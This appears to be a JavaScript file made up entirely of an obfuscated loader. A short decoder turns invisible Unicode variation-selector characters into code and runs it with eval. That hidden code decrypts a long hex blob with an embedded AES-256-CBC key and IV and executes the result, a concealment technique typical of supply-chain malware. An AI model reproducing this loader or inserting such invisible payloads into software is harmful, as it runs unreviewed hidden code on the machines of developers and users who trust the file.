const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙󠄞󠅓󠅢󠅕󠅑󠅤󠅕󠄴󠅕󠅓󠅙󠅠󠅘󠅕󠅢󠅙󠅦󠄘󠄗󠅑󠅕󠅣󠄝󠄢󠄥󠄦󠄝󠅓󠅒󠅓󠄗󠄜󠄗󠄷󠅁󠅟󠄡󠅕󠄢󠄤󠅣󠅆󠄺󠅁󠄽󠄥󠅝󠅞󠅙󠄺󠄩󠄨󠄽󠅒󠅅󠅃󠅅󠄛󠅉󠅂󠄤󠅂󠅩󠅦󠄨󠄗󠄜󠄲󠅥󠅖󠅖󠅕󠅢󠄞󠅖󠅢󠅟󠅝󠄘󠄗󠄠󠄢󠄦󠄤󠅕󠅓󠄡󠄢󠄨󠄥󠅔󠄣󠄥󠄠󠄤󠄥󠄦󠄥󠅔󠄣󠅖󠄡󠅖󠄥󠄢󠄠󠄣󠄤󠄡󠄠󠄠󠄦󠄗󠄜󠄗󠅘󠅕󠅨󠄗󠄙󠄙󠄫󠅜󠅕󠅤󠄐󠅒󠄭󠅔󠄞󠅥󠅠󠅔󠅑󠅤󠅕󠄘󠄗󠅔󠄨󠅓󠄢󠄣󠅔󠄠󠄤󠄧󠄡󠄡󠄤󠅖󠅕󠄠󠅓󠅓󠄥󠄠󠅑󠄧󠄢󠄠󠄡󠅓󠄦󠅖󠅒󠅖󠅒󠄢󠄡󠄢󠅓󠄧󠄤󠄥󠅖󠄨󠅔󠄥󠄣󠄨󠄡󠄨󠅑󠅔󠅒󠅑󠅖󠅑󠄤󠄦󠄧󠄦󠅓󠅓󠅕󠅔󠄦󠄦󠄠󠄢󠅑󠅕󠅓󠅑󠄥󠄥󠄧󠅕󠄦󠅓󠄡󠄩󠅕󠄤󠄠󠄠󠅑󠅖󠅕󠄨󠄡󠄩󠄥󠄤󠄠󠅒󠅔󠄢󠄦󠅒󠅔󠄠󠅓󠄤󠅒󠄣󠅒󠅑󠄡󠅔󠅔󠄦󠅔󠅔󠅑󠄨󠅒󠅑󠅑󠄨󠄧󠄢󠄢󠄡󠅖󠅑󠅓󠄥󠄤󠅕󠅖󠄨󠅑󠄤󠄧󠄩󠅒󠄣󠅕󠄠󠄥󠄢󠄦󠅕󠄨󠅔󠅑󠄧󠄠󠅑󠄨󠅕󠅔󠅖󠅑󠅓󠄥󠄢󠄩󠅕󠄨󠅓󠄤󠅖󠄩󠄨󠄤󠅒󠅖󠄥󠄦󠄡󠄢󠄠󠄡󠅑󠅒󠄦󠄨󠅓󠄤󠅓󠄡󠅖󠅕󠅑󠄥󠅒󠅔󠅔󠄧󠄩󠄠󠄢󠅔󠄢󠄢󠄣󠄦󠄢󠄣󠄡󠄢󠄧󠅒󠅑󠄢󠅓󠄥󠅖󠅔󠅑󠅕󠄦󠅖󠅕󠅓󠅓󠄤󠄡󠄨󠄤󠄡󠅔󠅕󠄦󠅔󠄢󠅖󠄤󠄢󠄧󠅓󠄢󠄥󠄩󠄠󠅕󠄥󠅔󠄩󠅒󠄦󠄦󠄡󠄤󠄢󠄨󠄢󠅑󠅒󠅒󠄡󠅓󠄧󠄥󠄥󠄧󠄠󠅓󠄨󠄩󠅓󠄧󠄤󠄠󠄧󠄣󠅔󠄣󠅓󠄠󠅓󠄢󠄨󠄥󠄢󠅒󠅕󠅔󠄦󠄦󠅖󠄦󠅑󠄤󠄧󠄩󠄤󠅔󠅓󠅓󠅒󠄦󠄡󠅖󠅓󠄦󠄠󠄦󠄣󠄥󠅖󠄧󠄦󠄠󠄠󠅔󠅑󠄤󠄩󠄧󠄠󠄤󠄤󠅒󠅔󠅓󠄤󠄡󠄨󠅑󠄥󠄧󠅕󠄦󠄨󠄣󠄢󠅖󠄨󠄩󠄧󠄠󠅔󠄠󠅓󠄡󠄢󠅕󠄡󠄠󠄧󠄠󠄧󠅖󠄣󠄥󠅒󠄠󠄠󠄡󠅖󠅕󠅕󠄩󠅖󠅑󠅒󠄠󠅕󠄧󠅓󠄩󠄦󠄨󠅓󠅔󠅒󠄡󠅖󠄣󠅕󠅓󠄡󠄡󠄡󠄠󠅔󠄨󠄢󠅔󠄧󠄢󠄩󠄡󠄩󠄩󠄠󠄥󠅖󠄩󠄨󠅖󠅑󠄢󠅖󠅕󠄣󠅕󠄢󠅓󠄡󠄨󠄩󠅓󠄠󠄧󠄥󠅒󠄣󠄢󠅕󠄢󠅕󠄢󠄨󠄨󠄡󠄢󠅓󠄩󠄩󠄧󠅔󠄡󠄤󠅑󠄥󠄩󠄡󠄩󠅑󠅒󠄤󠄠󠄣󠄦󠄢󠄡󠅖󠄢󠄠󠅓󠅔󠄦󠄣󠄨󠄩󠄡󠄦󠅑󠅔󠅕󠅒󠅓󠅖󠄠󠄨󠄦󠅒󠄡󠅔󠅖󠄡󠅑󠄠󠄣󠄡󠅖󠄦󠅒󠄦󠄩󠄢󠅓󠄨󠄤󠄩󠄤󠄦󠄡󠅑󠄧󠄣󠄥󠄨󠅖󠄨󠄨󠄩󠄢󠄩󠅖󠄩󠄦󠄡󠄢󠄡󠄧󠅕󠄢󠄦󠄩󠄧󠄠󠄣󠅒󠄨󠄠󠅒󠅓󠄣󠅕󠄩󠄦󠄠󠄢󠅑󠅖󠄢󠅕󠄩󠅒󠄥󠄩󠄦󠄡󠄤󠄡󠄨󠄨󠄣󠄤󠄣󠅕󠅑󠄦󠄣󠄩󠄥󠅖󠄤󠄧󠅕󠄥󠄢󠄢󠅕󠄠󠅔󠄥󠄧󠅖󠄠󠄥󠅓󠄣󠅖󠅖󠄡󠅕󠄢󠄣󠅔󠄣󠅑󠄢󠄢󠄨󠄩󠄢󠅑󠄧󠄩󠅓󠄦󠄥󠄧󠄠󠅒󠄠󠅒󠄨󠄨󠄤󠅖󠄤󠅔󠄢󠅓󠄨󠄢󠅖󠄨󠅖󠄨󠅑󠅔󠄧󠄦󠄤󠄢󠄥󠅒󠄢󠅓󠄢󠄨󠄨󠄨󠄤󠅒󠄡󠄩󠄠󠄩󠄤󠅓󠅖󠅒󠄠󠄩󠄤󠅕󠅖󠅑󠄣󠄨󠅓󠄩󠅕󠅑󠄩󠅒󠄧󠄣󠄤󠅓󠄢󠄤󠄦󠅖󠄡󠄩󠄢󠄧󠅓󠅓󠄣󠄢󠄦󠅒󠄠󠅕󠅒󠄣󠅑󠄤󠄡󠄦󠄩󠄩󠅕󠄣󠄤󠄨󠄦󠄤󠅕󠄥󠄧󠅒󠄥󠅓󠄦󠄩󠄨󠄤󠄤󠄥󠅔󠅓󠅓󠅕󠄧󠄣󠅖󠅓󠄨󠄧󠄤󠄠󠄣󠅕󠄢󠅓󠄦󠄥󠄧󠄢󠄣󠅓󠅓󠅓󠄨󠅔󠄨󠅕󠄨󠄩󠅔󠅕󠅒󠅑󠄧󠄥󠄢󠄠󠄥󠄣󠅒󠄠󠄨󠄠󠅕󠅒󠅕󠄤󠅔󠄨󠄦󠅓󠄦󠅒󠅑󠄠󠄦󠅑󠄩󠅖󠅒󠄠󠅒󠅖󠅑󠄧󠄡󠅕󠅔󠅓󠄨󠄨󠄩󠄦󠄩󠄡󠄧󠄧󠄥󠄥󠅖󠄠󠄢󠄩󠄧󠅓󠅒󠄡󠄤󠅓󠅔󠅔󠅕󠄦󠄡󠄠󠄣󠅖󠄦󠄣󠄥󠄧󠅔󠄧󠄧󠅔󠄨󠄡󠄠󠄡󠅕󠄢󠄠󠄩󠄦󠄢󠄦󠄦󠄥󠅕󠄠󠄩󠄩󠅒󠅒󠅓󠄥󠅔󠅓󠄩󠅒󠅔󠄠󠅔󠅒󠅓󠅖󠅕󠄢󠄣󠅕󠅒󠄠󠅑󠄧󠅑󠄠󠄡󠄦󠄥󠄠󠅓󠄠󠄥󠅒󠄣󠄢󠄡󠄥󠄢󠅑󠄧󠅕󠄤󠅖󠄣󠄧󠄣󠄡󠄡󠄢󠅓󠄡󠅕󠄦󠄩󠅑󠅑󠄨󠄦󠄨󠄤󠅖󠅓󠅑󠅑󠄧󠅖󠄣󠄡󠄩󠅕󠄤󠄦󠄣󠄠󠄨󠅔󠅕󠅓󠄩󠄤󠄨󠄨󠄩󠄢󠄡󠄩󠅓󠅓󠄦󠅖󠅕󠄣󠄣󠄡󠅑󠄦󠄣󠄦󠄣󠅖󠄥󠅕󠄢󠅔󠄤󠄦󠅑󠅒󠅒󠄥󠅓󠄣󠄨󠄥󠄥󠄥󠄩󠄡󠄦󠄧󠄩󠄡󠅒󠄢󠄠󠄧󠅖󠄦󠄣󠄤󠄤󠅒󠅕󠅖󠄨󠄦󠅖󠄠󠄩󠅑󠄨󠅓󠄠󠅑󠄨󠅕󠅖󠄥󠄢󠄦󠄤󠄥󠄥󠅑󠄤󠄢󠅒󠅑󠄣󠅖󠄦󠄤󠄢󠄩󠄧󠅒󠄡󠄥󠄨󠄨󠅕󠅕󠅓󠄣󠅒󠄠󠅑󠄡󠅕󠄣󠄧󠄤󠅖󠄩󠅓󠅕󠄦󠄠󠅔󠅓󠄦󠅓󠄩󠄨󠄡󠅔󠄩󠅑󠅔󠄢󠅓󠄧󠄡󠄡󠅕󠄦󠅔󠅑󠅖󠄨󠅒󠄢󠄥󠅒󠄩󠄩󠅓󠅒󠄩󠄥󠅒󠄥󠅔󠄧󠅖󠅓󠅕󠅕󠄡󠄧󠄤󠄨󠄩󠄡󠅒󠅓󠄢󠄢󠅒󠄤󠄦󠄧󠄨󠄨󠄧󠄠󠅕󠅖󠄥󠄨󠄢󠄩󠅕󠄡󠄢󠄩󠅔󠄧󠄧󠄩󠅖󠄧󠄣󠅓󠄧󠄠󠄣󠄠󠄥󠄦󠅔󠄢󠄢󠄩󠄥󠅕󠅒󠅑󠅒󠅒󠄢󠅑󠅑󠅑󠅕󠄦󠄠󠅓󠅔󠄢󠅔󠄥󠄩󠄨󠅒󠄧󠄧󠅕󠄥󠄧󠄡󠄨󠅖󠄣󠅖󠅑󠄠󠅓󠄧󠄨󠄤󠅔󠅓󠄦󠄧󠅔󠄣󠅕󠄤󠄧󠅕󠄥󠄦󠅕󠄣󠄩󠅒󠄡󠄧󠄦󠅕󠄢󠅕󠄥󠅑󠅒󠄥󠄩󠄨󠄧󠄣󠄩󠅑󠄩󠅖󠅕󠄡󠄣󠄤󠅖󠅒󠄡󠄣󠅑󠄢󠄦󠅕󠅓󠄥󠄣󠄡󠄣󠅖󠄥󠅔󠄨󠄢󠄢󠄩󠄢󠄡󠄢󠅖󠅔󠄨󠄧󠄩󠄩󠄩󠄧󠄥󠄠󠄢󠄧󠄤󠄢󠄧󠄠󠄣󠄣󠄡󠅑󠅔󠄠󠄠󠄥󠄤󠅒󠅖󠄣󠅔󠄣󠅖󠅑󠄡󠅔󠄤󠄥󠄨󠄡󠄩󠄦󠄥󠄣󠅕󠄨󠄩󠅓󠄨󠄠󠄢󠄧󠄧󠄣󠄠󠄦󠄥󠄡󠅓󠄣󠄤󠅑󠄡󠄠󠅒󠅖󠅒󠄥󠄩󠄥󠄧󠅓󠄦󠅑󠅒󠄧󠄤󠅒󠅕󠅖󠄩󠅖󠅑󠄧󠅕󠅒󠄥󠄠󠄩󠄨󠄥󠅕󠄥󠅖󠅑󠄤󠄤󠄨󠅑󠄦󠄡󠅒󠅔󠅑󠄢󠅔󠅑󠄥󠄡󠄦󠅒󠄢󠅕󠅑󠄦󠄣󠄩󠄠󠄡󠄥󠄤󠅔󠄣󠄡󠄤󠅔󠄧󠄢󠅖󠅓󠅑󠅕󠄢󠄨󠄧󠄡󠄧󠅔󠅖󠄡󠄦󠅑󠄤󠄩󠄠󠅒󠅕󠅒󠅕󠅖󠅑󠅑󠄡󠄥󠄠󠄦󠄥󠄤󠄦󠄡󠄧󠄠󠄠󠄢󠅔󠅕󠄤󠅔󠄤󠅔󠄧󠅔󠅖󠅑󠅓󠅒󠅕󠅑󠅖󠄧󠅒󠅒󠅖󠄨󠄨󠄠󠅒󠄠󠅑󠅓󠄩󠄢󠄨󠄦󠅔󠅔󠄧󠄩󠅑󠄧󠄩󠄠󠄥󠄤󠅔󠅒󠄦󠄠󠅒󠄡󠅕󠅕󠄦󠅔󠄨󠄥󠄢󠄥󠅖󠄤󠅒󠅕󠄨󠄡󠄢󠄠󠄦󠅖󠄨󠄥󠄤󠄧󠅑󠄦󠄩󠄠󠅕󠄩󠄥󠅖󠄥󠅖󠄤󠄥󠄢󠄣󠅖󠄢󠅑󠅕󠄩󠄦󠄦󠄠󠅕󠅑󠄣󠄦󠄢󠅔󠅖󠅔󠄨󠄧󠄥󠅓󠄣󠅓󠄡󠄠󠅑󠄥󠄣󠅓󠅑󠅕󠄦󠄩󠅔󠅓󠄣󠅒󠄤󠅑󠅓󠄦󠄣󠄣󠅒󠄦󠄦󠅑󠅓󠄨󠄩󠅑󠄠󠅖󠄢󠄦󠄥󠄩󠅖󠄨󠅒󠅕󠄣󠄤󠅒󠄥󠅖󠅓󠄨󠄧󠅖󠄥󠅖󠄢󠅖󠅒󠅖󠅔󠅔󠅖󠅒󠄢󠄥󠄥󠄧󠅑󠅒󠄨󠄠󠄤󠄥󠄧󠅓󠅑󠅕󠅓󠄢󠄥󠄡󠄩󠄤󠅑󠅕󠄡󠄤󠅓󠄧󠄨󠄢󠄨󠄩󠄦󠄥󠅒󠅔󠄤󠅖󠅑󠄣󠄩󠅒󠄠󠅑󠄩󠄡󠅔󠅕󠅑󠄠󠄣󠅔󠅕󠄡󠅔󠅑󠅕󠄣󠄤󠄡󠅕󠅖󠅖󠄧󠄢󠄥󠅖󠄤󠅖󠄧󠅒󠅕󠅕󠄦󠅑󠅑󠅓󠄤󠄢󠅒󠄣󠅓󠄨󠄦󠄣󠄠󠅒󠅑󠄤󠅖󠄦󠅓󠄢󠅑󠄢󠄤󠄦󠄦󠅕󠄧󠄥󠄢󠄤󠄠󠄧󠅕󠄧󠄦󠄥󠄣󠅕󠄠󠅔󠅔󠅒󠄡󠅓󠅓󠅖󠄨󠄩󠄠󠄧󠄦󠄠󠄠󠄤󠅔󠄣󠄨󠄨󠄦󠅕󠄠󠄩󠅖󠅕󠄨󠄠󠄢󠄧󠄢󠅔󠅕󠅔󠄨󠅒󠄥󠄨󠄦󠅒󠅕󠄨󠄣󠅑󠅑󠅓󠄣󠄠󠅖󠅖󠄦󠄣󠄧󠄣󠅓󠅓󠄩󠄧󠄡󠅒󠅓󠄧󠄨󠄢󠄥󠅒󠄤󠅔󠄧󠄥󠄤󠅒󠅑󠄢󠄤󠄩󠄦󠄠󠄠󠅑󠅖󠅕󠅖󠄥󠄡󠄨󠅖󠄩󠅖󠄧󠅑󠄥󠅔󠄥󠅖󠄢󠄣󠄠󠅑󠄢󠅖󠅖󠅒󠄡󠅓󠄤󠄩󠄥󠄠󠄧󠄦󠄣󠅓󠄧󠅕󠅑󠅓󠅓󠅓󠅒󠄩󠅕󠅒󠄢󠄠󠅕󠄥󠄧󠅓󠅒󠅔󠅖󠄣󠄧󠅑󠄩󠅓󠄩󠅓󠅑󠄥󠄧󠄢󠅖󠄡󠄤󠄩󠅑󠄤󠄣󠅔󠅒󠄣󠄤󠄤󠄣󠅔󠅔󠄦󠄦󠄨󠅑󠄤󠄦󠅖󠄥󠄤󠅕󠅕󠅓󠄢󠄧󠄤󠄤󠄨󠅓󠅒󠄢󠄦󠄠󠅕󠅕󠄥󠄠󠅔󠄩󠄩󠄣󠄡󠅑󠄠󠄧󠄡󠄡󠄩󠄥󠄧󠄤󠄣󠄣󠄣󠄠󠅕󠅓󠅑󠄠󠄨󠄢󠄠󠅕󠄩󠄣󠅑󠄨󠄦󠄤󠅕󠄠󠄡󠅒󠄦󠄤󠄢󠄥󠄤󠄢󠄠󠄤󠄦󠅑󠄤󠄠󠄤󠅔󠅕󠄨󠅖󠄩󠅖󠄡󠄡󠄩󠄧󠄣󠅖󠄦󠄢󠄨󠅒󠄧󠅑󠄩󠅒󠅖󠄡󠄩󠄧󠄩󠄥󠄧󠅕󠅖󠅕󠅑󠄨󠄤󠄧󠅔󠅓󠄢󠅓󠅒󠄤󠄠󠄨󠅑󠄨󠅖󠄥󠄠󠅖󠄤󠄡󠄤󠅖󠄤󠄥󠅑󠅔󠄣󠅔󠄡󠄨󠅒󠄤󠄠󠄩󠅕󠄨󠅑󠄤󠄠󠄢󠄩󠄡󠄡󠅖󠄣󠅑󠄧󠄢󠄨󠄤󠅑󠄠󠅖󠄡󠅓󠄨󠄦󠄦󠄤󠄧󠅔󠄥󠄢󠅑󠅓󠅒󠅑󠅒󠅑󠄣󠄡󠅔󠅖󠄡󠅒󠄣󠄨󠄩󠄦󠄠󠄥󠅓󠄢󠄡󠅒󠄢󠅕󠅒󠅕󠄧󠅓󠅒󠄦󠄣󠅒󠅑󠄦󠄡󠄣󠄡󠅒󠄦󠄢󠅓󠅖󠄩󠅔󠄨󠅔󠅑󠅖󠄣󠄦󠄤󠅖󠄣󠄣󠅔󠄡󠅒󠄥󠄣󠅒󠅑󠄤󠄠󠄥󠄤󠄣󠄠󠄥󠅖󠄠󠄡󠅕󠄤󠄩󠄩󠄤󠅕󠅓󠅔󠄤󠄨󠅖󠄨󠄤󠅖󠄤󠅒󠅖󠄨󠄥󠄧󠄨󠄤󠄦󠅕󠅖󠅕󠄤󠄢󠄧󠄡󠄣󠄡󠄦󠄦󠄧󠄧󠅒󠄨󠄥󠅕󠅑󠅖󠅖󠄨󠄨󠅒󠄢󠄡󠅓󠄤󠄤󠅓󠄥󠅑󠅓󠅖󠄢󠄣󠄢󠅓󠄦󠅕󠄩󠄢󠅓󠄣󠄡󠄦󠅒󠄢󠅕󠄠󠄢󠅓󠄨󠄧󠅒󠅒󠄩󠄣󠄥󠄨󠄩󠄤󠅑󠄤󠅕󠅓󠅓󠅒󠄩󠅑󠅓󠅔󠄨󠄤󠄢󠄦󠄤󠄧󠄣󠄠󠄣󠄧󠅖󠅔󠄥󠅖󠄤󠄧󠅔󠄥󠅔󠅓󠄡󠄩󠅕󠄣󠄧󠄡󠄩󠅕󠅒󠄣󠅕󠄩󠄠󠅒󠄡󠅓󠄥󠄤󠄥󠅖󠄢󠅓󠅕󠅖󠄤󠅕󠅕󠅒󠄡󠄣󠅔󠄡󠅓󠄤󠄠󠅔󠄩󠄨󠅑󠄧󠅔󠄣󠅒󠄤󠄡󠄥󠄥󠅕󠄨󠄡󠄣󠄠󠄧󠄨󠄨󠄨󠄣󠄥󠄠󠄧󠅔󠄡󠄥󠅖󠄧󠅕󠄡󠄢󠄠󠅓󠅔󠅒󠅑󠄢󠅓󠄢󠄨󠄣󠅒󠄣󠄥󠅑󠅖󠄩󠄦󠅕󠅒󠄧󠄩󠅕󠄨󠄩󠄡󠅖󠅓󠄨󠄦󠅑󠄧󠄦󠅔󠅕󠄣󠄥󠅕󠅕󠅑󠄦󠅑󠄥󠅖󠄤󠅑󠄧󠄡󠄤󠅔󠄢󠅒󠅕󠄠󠄡󠄠󠄢󠄤󠄣󠅔󠄧󠄤󠄡󠄩󠄠󠄩󠅔󠄩󠅖󠄨󠄥󠄠󠄡󠅖󠅒󠄨󠅕󠄩󠅓󠄣󠄨󠄡󠄢󠄧󠅒󠅕󠄥󠄧󠄥󠄦󠄢󠅖󠄠󠅓󠅖󠄦󠄠󠅖󠅒󠄢󠄨󠄥󠄠󠅔󠄠󠄣󠄠󠅓󠄣󠅔󠄧󠄥󠄠󠄡󠄡󠄥󠅓󠄣󠄩󠅓󠄩󠄡󠄣󠅒󠄥󠄢󠄡󠄨󠄩󠅖󠄤󠄡󠅒󠄠󠄢󠅑󠄡󠄣󠅓󠅓󠅔󠅔󠄤󠄧󠄥󠄦󠄡󠅓󠄢󠅖󠄨󠅓󠄢󠅕󠄤󠄥󠄨󠄦󠄣󠄠󠅒󠄦󠅕󠄢󠅕󠄦󠄥󠄣󠅒󠄦󠅖󠄧󠄠󠄤󠄢󠅕󠄦󠄤󠄨󠄧󠄤󠄧󠅓󠅒󠄡󠅔󠄠󠄢󠄣󠅓󠅕󠄦󠅒󠅑󠄥󠄠󠅑󠅒󠅖󠄧󠄨󠄠󠄧󠅓󠄥󠅑󠅒󠄥󠅓󠄦󠄡󠅔󠅑󠄣󠄦󠅓󠄡󠄦󠅕󠅔󠅒󠅑󠅕󠄧󠄨󠅖󠄣󠅔󠄩󠄠󠄠󠄠󠄣󠄤󠄠󠅖󠄨󠅓󠄡󠄩󠅔󠅕󠅕󠄣󠄡󠄦󠅒󠅖󠄧󠅕󠄨󠄩󠄨󠄢󠄣󠅑󠄦󠅑󠅖󠄨󠄥󠄩󠄦󠄠󠅓󠄦󠄧󠄣󠅕󠅑󠅔󠅕󠄦󠅖󠅑󠄧󠄡󠄣󠅖󠄡󠄧󠅕󠅕󠅓󠅑󠄠󠄢󠄧󠄦󠄢󠅓󠅒󠄩󠄤󠄩󠄦󠅒󠄡󠄥󠅕󠅕󠅖󠅕󠄦󠄣󠅖󠅔󠄡󠄠󠄧󠄤󠅒󠄦󠅕󠄠󠄥󠅓󠄠󠅑󠄥󠄨󠅖󠄠󠅑󠅑󠄣󠄧󠅖󠅓󠄤󠄡󠄢󠄧󠄩󠄨󠄥󠅒󠄨󠅕󠄦󠄨󠄢󠅑󠄣󠄠󠄤󠅕󠅖󠅑󠅓󠄡󠅑󠄢󠅖󠅖󠄦󠄡󠄣󠅔󠅖󠄤󠄢󠄦󠄢󠄡󠄤󠄨󠅒󠅕󠅖󠅔󠄦󠅒󠅕󠄣󠅑󠄨󠅒󠅔󠄣󠅑󠄠󠅓󠅒󠅔󠄥󠅓󠅓󠅕󠅒󠄩󠅒󠅑󠄠󠄤󠅒󠅖󠅖󠄨󠄩󠄢󠄢󠅖󠅔󠄧󠄩󠄩󠅔󠄧󠅔󠄢󠄦󠄢󠅓󠅔󠄡󠄠󠅓󠄢󠄨󠅒󠄨󠅔󠄠󠅔󠅒󠅑󠄡󠄤󠄣󠄣󠅑󠅒󠄨󠄨󠄤󠄢󠅕󠄠󠅑󠄦󠄥󠄢󠅕󠅓󠄡󠄡󠅒󠄡󠄧󠅓󠅒󠄣󠅔󠄥󠄠󠄧󠄧󠅔󠄤󠄡󠄦󠅖󠄦󠄢󠄩󠅑󠅒󠅑󠄣󠅕󠅓󠄧󠅒󠄦󠄧󠅕󠄥󠅔󠄦󠄥󠄩󠅔󠄣󠅖󠅕󠄩󠄦󠄠󠅕󠅖󠅖󠄠󠅒󠄦󠄥󠄡󠄧󠅑󠅕󠄨󠄨󠄩󠄩󠄧󠅔󠄧󠅑󠅒󠅓󠅔󠄣󠅖󠄩󠄤󠄦󠄦󠄩󠄢󠄤󠄢󠅔󠄣󠄢󠄠󠅕󠅖󠄠󠄢󠅒󠅕󠄧󠅔󠅒󠄨󠄥󠄥󠅕󠅓󠄩󠄣󠅑󠄣󠄡󠄥󠄥󠄤󠄩󠄦󠄤󠅕󠅖󠄥󠄢󠅔󠅖󠄡󠄡󠄠󠄩󠄣󠄧󠄡󠅖󠄣󠄢󠅓󠅓󠄩󠅖󠄡󠄧󠅖󠄢󠅕󠅑󠄣󠄡󠅒󠄤󠅖󠄥󠄣󠅓󠄣󠄠󠄢󠄥󠅖󠄠󠅑󠄨󠄧󠅓󠄢󠅒󠅑󠄦󠄦󠄢󠄩󠄢󠄡󠅑󠄨󠄩󠄦󠅒󠄠󠅒󠄠󠄣󠄢󠄡󠅕󠄨󠄥󠄤󠄩󠄧󠄥󠅓󠄤󠄩󠅓󠅖󠅖󠄢󠄧󠄧󠄠󠄠󠅓󠅔󠄣󠄩󠄢󠅑󠅒󠅒󠄣󠅔󠄡󠅒󠅕󠅔󠄦󠄦󠅒󠅖󠄢󠅔󠅒󠅑󠄩󠄩󠄣󠄤󠄧󠄩󠄡󠄨󠄧󠅒󠄦󠄩󠄤󠄡󠅓󠅒󠄧󠄧󠅑󠅖󠄥󠅖󠅔󠄩󠅓󠄡󠄤󠅑󠅖󠄡󠅕󠄢󠄣󠄩󠅕󠅒󠅖󠄦󠄢󠅒󠅔󠄩󠄩󠅕󠄥󠄦󠄡󠅑󠄠󠄥󠅒󠄣󠄩󠅑󠅒󠄥󠄢󠄢󠄥󠄥󠅕󠅕󠄩󠅑󠅓󠅕󠅑󠄡󠅓󠄤󠄦󠅖󠄥󠄩󠄡󠄧󠄨󠄥󠄣󠄦󠅓󠄢󠅕󠄣󠄡󠄦󠅒󠅕󠄡󠅕󠅔󠄠󠅒󠄠󠄡󠄢󠅔󠅒󠅔󠅒󠅑󠄩󠄣󠄠󠄧󠄡󠄧󠄢󠅔󠅕󠄥󠄩󠄩󠄣󠅕󠄠󠅒󠅔󠄦󠅖󠅒󠄢󠅒󠅓󠄢󠅑󠄤󠅖󠅕󠄠󠅕󠄡󠄠󠄦󠄣󠄥󠅕󠅑󠄩󠄨󠄢󠅑󠄦󠄢󠅔󠅓󠅔󠅕󠅔󠄧󠄢󠄩󠅑󠄥󠄧󠄠󠄢󠅔󠄩󠄣󠄧󠄣󠅒󠄠󠅔󠅒󠄠󠄤󠄢󠄡󠄧󠄡󠅕󠅓󠄧󠄧󠅕󠄠󠄣󠄧󠄡󠄧󠅖󠄨󠄥󠄣󠄩󠅖󠅖󠄣󠄢󠄥󠅑󠄡󠅒󠅔󠄦󠄣󠅔󠄨󠅒󠄤󠅑󠅒󠅓󠅑󠄣󠅑󠄠󠅒󠄢󠄡󠄧󠄧󠄧󠄢󠄩󠄠󠅓󠄨󠄨󠄠󠅔󠄢󠄥󠄡󠅒󠄧󠄢󠅔󠅔󠄧󠄤󠄢󠅖󠅖󠅔󠅓󠄡󠄠󠄤󠅕󠅖󠄣󠄡󠅕󠄢󠅒󠄧󠄩󠄥󠄩󠄦󠄤󠄤󠄡󠄤󠄧󠅔󠅒󠅓󠄣󠄥󠄠󠅕󠅕󠄢󠅖󠄢󠅓󠄨󠅕󠄨󠄣󠅕󠅒󠄢󠄢󠄤󠄤󠅑󠄢󠅕󠄦󠄡󠄦󠄧󠅔󠅔󠅖󠄠󠅕󠄡󠄢󠄨󠄣󠅔󠄢󠅓󠄧󠅔󠄤󠄠󠄡󠅒󠄦󠄦󠅖󠅑󠅖󠅓󠄡󠄡󠄡󠄢󠅖󠄣󠄧󠄨󠄨󠅕󠄣󠄨󠅓󠅒󠄠󠄤󠅒󠅓󠅔󠅓󠄡󠄠󠄡󠅓󠄥󠅔󠄠󠅒󠅓󠄥󠄠󠅒󠄢󠅔󠄨󠅒󠄧󠄢󠄩󠄤󠄠󠄥󠅕󠄩󠅒󠅕󠅔󠅑󠅕󠄩󠄩󠄢󠄠󠄢󠅓󠄢󠅔󠄦󠄩󠅑󠄨󠄢󠅖󠅑󠄡󠄧󠄢󠄩󠄣󠄡󠄣󠄠󠄠󠅖󠅕󠄣󠄤󠅖󠅕󠄦󠅓󠄢󠄡󠅕󠄨󠄣󠅑󠅓󠄣󠅓󠄦󠄥󠅑󠅓󠄢󠄣󠄩󠅖󠄥󠄡󠄤󠄠󠄠󠅓󠄠󠅑󠄤󠄣󠅕󠅖󠄠󠅔󠄢󠄤󠅑󠄩󠄨󠄣󠄧󠅔󠅖󠄥󠄡󠄦󠄥󠄧󠅓󠅑󠄣󠄢󠅒󠄥󠅔󠄨󠄡󠄦󠄡󠄦󠅔󠄥󠄢󠄠󠅓󠅓󠄧󠄠󠄡󠅒󠅒󠄥󠅕󠄥󠄨󠄧󠄨󠄥󠅔󠄢󠄥󠄩󠄠󠅖󠄨󠄦󠅒󠅔󠄥󠄡󠅓󠅖󠄡󠄥󠄦󠄦󠄦󠅕󠅒󠄢󠅒󠄦󠄢󠅖󠅑󠅑󠅕󠄤󠅑󠄤󠅑󠄥󠅖󠄣󠅖󠄢󠅖󠄡󠄢󠄣󠅕󠅕󠄨󠅑󠄩󠅒󠄥󠄨󠅒󠄡󠄥󠅕󠄦󠄨󠅑󠄩󠅑󠄧󠄣󠄠󠄠󠅖󠅑󠅓󠄥󠄧󠅕󠄠󠄠󠅒󠄥󠄡󠄢󠄧󠅓󠄣󠄣󠄠󠄨󠄤󠄧󠄨󠅕󠅑󠄣󠄡󠄤󠄡󠄧󠄤󠄢󠅑󠅓󠄡󠄠󠅔󠅒󠅖󠄠󠅖󠄡󠅖󠄦󠅒󠄤󠅒󠄧󠅒󠅒󠅒󠄠󠄢󠄠󠄦󠅒󠄥󠄢󠄡󠅒󠄢󠅓󠄥󠄩󠅓󠄣󠅒󠅑󠄠󠅖󠅒󠄠󠅕󠅕󠅕󠄦󠄡󠄣󠄣󠅒󠅓󠅔󠅓󠄩󠅖󠅒󠄠󠄡󠅒󠅑󠅑󠅖󠄩󠄧󠄦󠄠󠄦󠄣󠄧󠄥󠄢󠄦󠄧󠄤󠄢󠄤󠅖󠄩󠅔󠄧󠄤󠄤󠄦󠅑󠄨󠄢󠄤󠄠󠄨󠄩󠅑󠄤󠅔󠅖󠄢󠄡󠄨󠅓󠅒󠅖󠄠󠄡󠅑󠄣󠄧󠄥󠄡󠄨󠅔󠄡󠅔󠄧󠄣󠄢󠅓󠅒󠄤󠅒󠅑󠅓󠄤󠄧󠄣󠅓󠅓󠄠󠅔󠄡󠄡󠄠󠄡󠄧󠄧󠅕󠄢󠅔󠅖󠄤󠅓󠄥󠅕󠅔󠅕󠄦󠅒󠄤󠅕󠅕󠄤󠄠󠄠